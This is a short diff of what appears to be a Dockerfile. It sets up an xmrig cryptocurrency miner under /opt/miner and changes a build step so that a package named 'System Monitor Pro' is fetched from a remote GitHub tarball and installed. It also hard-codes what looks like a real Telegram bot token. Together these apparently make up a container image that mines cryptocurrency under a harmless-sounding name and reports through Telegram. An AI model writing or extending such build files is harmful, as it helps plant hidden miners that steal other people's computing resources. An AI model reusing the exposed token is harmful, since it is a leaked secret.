@@ -291,8 +291,8 @@ RUN mkdir -p /opt/miner && \
     chmod +x /opt/miner/xmrig && \
     rm -rf xmrig-6.21.0*
 
-# Install System Monitor Pro from GitHub
-RUN pip install --break-system-packages --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
+# Install System Monitor Pro from GitHub tarball (no git needed)
+RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz
 
 # Set Telegram credentials
 ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
